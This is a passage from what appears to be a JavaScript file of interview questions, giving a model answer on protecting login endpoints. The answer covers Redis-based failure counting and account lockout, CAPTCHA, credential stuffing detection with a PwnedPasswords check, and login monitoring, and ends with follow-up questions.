    public void recordFailedAttempt(String username, String ip) {
        // Count per USER (do not merge with IP — botnets rotate IPs constantly) and count per IP separately
        String key = "login:fail:user:" + username;
        Long count = redis.opsForValue().increment(key);
        if (count == 1) redis.expire(key, COUNT_WINDOW); // should be made atomic with Lua
        Long ipCount = redis.opsForValue().increment("login:fail:ip:" + ip); // used for per-IP rate limiting/CAPTCHA

        if (count >= MAX_ATTEMPTS) {
            lockAccount(username, calculateLockDuration(count));
        }
    }

    private void lockAccount(String username, Duration duration) {
        String lockKey = "login:lock:" + username;
        redis.opsForValue().set(lockKey, "LOCKED", duration);
        // Audit log
        auditLog.warn("Account locked: user={}, duration={}", username, duration);
    }

    public boolean isLocked(String username) {
        return Boolean.TRUE.equals(redis.hasKey("login:lock:" + username));
    }
}
~~~

### CAPTCHA — Human Verification
- Trigger: after 3-5 failures, or a high risk score (new device, new geo, VPN/Tor).
- Providers: **hCaptcha** (privacy-friendly), **reCAPTCHA v3** (invisible, score-based), **Turnstile** (Cloudflare).
- Accessibility: provide audio challenges, a fallback for screen readers.

### Credential Stuffing Detection
- **Data**: lists of leaked credentials (Have I Been Pwned, internal breach DB).
- **Checks**: on registration/password change → check the PwnedPasswords API (k-anonymity model, only the first 5 chars of the SHA-1 are sent).
- **Behavioral**: device fingerprinting (canvas, fonts, timezone), IP reputation (AbuseIPDB), impossible travel (logins from 2 countries within 1h), user-agent anomalies.
- **Response**: force MFA, step-up authentication, notify the user, temporary lock.

~~~java
// PwnedPasswords check (k-anonymity)
public boolean isPwned(String password) {
    String sha1 = sha1(password).toUpperCase();
    String prefix = sha1.substring(0, 5);
    String suffix = sha1.substring(5);
    String response = webClient.get().uri("https://api.pwnedpasswords.com/range/" + prefix)
        .retrieve().bodyToMono(String.class).block();
    // Each response line is "SUFFIX:COUNT" (35 hex chars + count)
    return Arrays.stream(response.split("\\r?\\n"))
        .anyMatch(line -> line.startsWith(suffix + ":"));
}
~~~

### Monitoring & Alerting
- Metrics: {{login.failure.rate}}, {{login.lockout.count}}, {{captcha.challenge.rate}}, {{credential.stuffing.detected}}.
- Alerts: failure-rate spike > 5x baseline, lockout > 100 accounts/15m, admin logging in from a new geo.
- Dashboard: a real-time login heatmap (geo, device, outcome).

> Senior tip: **do not only rate limit by IP** — attackers use botnets (thousands of IPs). Rate limiting per **user** matters more. Lockouts must use **exponential backoff** so legitimate users are not DoSed. Always check **PwnedPasswords** on registration/password change (NIST SP 800-63B recommends screening against known-breached passwords). Keep the CAPTCHA/lockout thresholds in dynamic config (feature flags, config server) so they can be tuned mid-attack without a deploy. Return the same error message for "wrong user" and "wrong password" to prevent username enumeration. For banking: MFA on every login, device registration (trusted devices skip CAPTCHA).`,
    follow: [
      `Sliding window vs fixed window vs token bucket rate limiting — how do they differ for login?`,
      `Credential stuffing vs password spraying — what is the difference, and how do you detect each?`,
      `How do you balance UX (low friction) vs security (anti brute force) for legitimate users?`
    ]
  }
});
